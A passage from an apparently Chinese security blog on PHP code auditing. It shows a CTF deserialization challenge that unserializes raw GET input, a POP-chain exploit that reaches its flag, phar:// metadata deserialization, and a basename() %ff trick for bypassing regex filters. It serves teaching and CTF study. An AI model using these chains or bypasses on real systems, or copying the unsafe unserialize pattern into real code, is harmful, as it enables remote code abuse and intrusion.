<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">private</span> $age;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$age)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'你用调用函数的方式调用了这个对象，所以我起作用了'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$ameng = <span class="keyword">new</span> Ameng(<span class="string">'Ameng'</span>,<span class="number">3</span>);</span><br><span class="line">	$ameng();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">执行结果——&gt;</span><br><span class="line">你用调用函数的方式调用了这个对象，所以我起作用</span><br></pre></td></tr></table></figure>

<h3 id="pop链的构造"><a href="#pop链的构造" class="headerlink" title="pop链的构造"></a>pop链的构造</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>寻找位点（unserialize函数—&gt;变量可控）</li>
<li>正向构造（各种方法）</li>
<li>反向推理（从要完成的目的出发，反向推理，最后找到最先被调用的位置处）</li>
</ol>
<p>来看一个简单的例子(HECTF)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">         <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">         <span class="keyword">$this</span>-&gt;token =&amp;<span class="keyword">$this</span>-&gt;token_flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"flag&#123;**********&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;params;</span><br><span class="line">        <span class="keyword">return</span> $func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'chal'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $chal = unserialize($_GET[<span class="string">'chal'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们要拿到flag，在<code>__invoke()</code>函数，当对象被当作函数调用时，那么就会自动执行该函数。所以我们要做的就是用函数来调用对象。</p>
<p>那么我们首先找到起点，就是unserialize函数的变量，因为这个变量是我们可控的，但是肯定是过滤了一些常见的协议，那些协议我在上面也简单介绍过用法。</p>
<p>通过函数的过程搜索，我们能够看到preg_match第二个参数会被当作字符串处理，在类Test中，我们可以给$func赋值给Read对象。</p>
<p>那么我们可以构造如下pop链</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    ··········</span><br><span class="line">    $read = <span class="keyword">new</span> Read();</span><br><span class="line">    $show = <span class="keyword">new</span> Show();</span><br><span class="line">    $test = <span class="keyword">new</span> Test();</span><br><span class="line">	</span><br><span class="line">	$read-&gt;token = &amp;$read-&gt;token_flag;</span><br><span class="line">    $test-&gt;params = $read;</span><br><span class="line">    $show-&gt;str[<span class="string">'str'</span>] = $test;</span><br><span class="line">    $show-&gt;source = $show;</span><br><span class="line">    <span class="keyword">echo</span> serialize($show);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>给个图总结一下：</p>
<p><img src="https://image.3001.net/images/20210425/16193177609106.png" alt="image-20210424041917873"></p>
<h3 id="phar与反序列化"><a href="#phar与反序列化" class="headerlink" title="phar与反序列化"></a>phar与反序列化</h3><p>简介 </p>
<p>PHAR（”PHP archive”）是PHP里类似JAR的一种打包文件，在PHP &gt; 5.3版本中默认开启。其实就是用来打包程序的。</p>
<p>文件结构 </p>
<ol>
<li><p>a stub：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>前面内容不限，后面必须以<code>__HALT_COMPILER();?&gt;</code>结尾，否则phar扩展无法将该文件识别为phar文件。</p>
</li>
<li><p>官方手册</p>
<p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
</li>
</ol>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>前提：将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为<code>off</code>，不然无法生成phar文件。</p>
<p>phar.php： </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $o -&gt; data=<span class="string">'Hello I am Ameng'</span>;</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在我们访问之后，会在当前目录下生成一个phar.phar文件。</p>
<p>然后查看文件的十六进制形式，我们就可以看到meta-data是以序列化的形式存储。既然存在序列化的数据，那肯定有序列化的逆向操作反序列化。那么这里在PHP中存在很多通过<code>phar://</code>伪协议解析phar文件时，会将meta-data进行反序列化。可用函数如下图</p>
<p><img src="https://image.3001.net/images/20210425/16193177636677.png" alt="image-20210424042041064"></p>
<p>Ameng.php </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; data;   <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://phar.phar'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//Hello I am Ameng</span></span><br></pre></td></tr></table></figure>

<h3 id="其他一些总结"><a href="#其他一些总结" class="headerlink" title="其他一些总结"></a>其他一些总结</h3><h4 id="basename"><a href="#basename" class="headerlink" title="basename()"></a>basename()</h4><p>此函数返回路径中的文件名的一部分(后面)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">basename(path,suffix)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>path：必需。规定要检查的路径。</li>
<li>suffix：可选。规定文件的扩展名。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $path = <span class="string">"index.php/test.php"</span>;</span><br><span class="line">	<span class="keyword">echo</span> basename($path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        </span><br><span class="line">执行结果——&gt;</span><br><span class="line">test.php</span><br></pre></td></tr></table></figure>

<p>此函数还有一个特点，就是会去掉文件名的非ASCII码值。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$path = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	print_r(basename($path));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//通过 url 传入参数`x=index.php/config.php/%ff`</span></span><br><span class="line"><span class="comment">//结果：回显config.php</span></span><br></pre></td></tr></table></figure>

<p>可以看到，<code>%ff</code>直接没了，而是直接输出前面的的文件名，这个可以用来绕过一些正则匹配。原因就在于<code>%ff</code>在通过 url 传参时会被 url 解码，解码成了不可见字符，满足了<code>basename</code>函数对文件名的非ASCII值去除的特点，从而被删掉。</p>
<p>参考链接：<a href="https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html（狼组知识库）" target="_blank" rel="noopener">https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html（狼组知识库）</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>危险函数</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
</search>
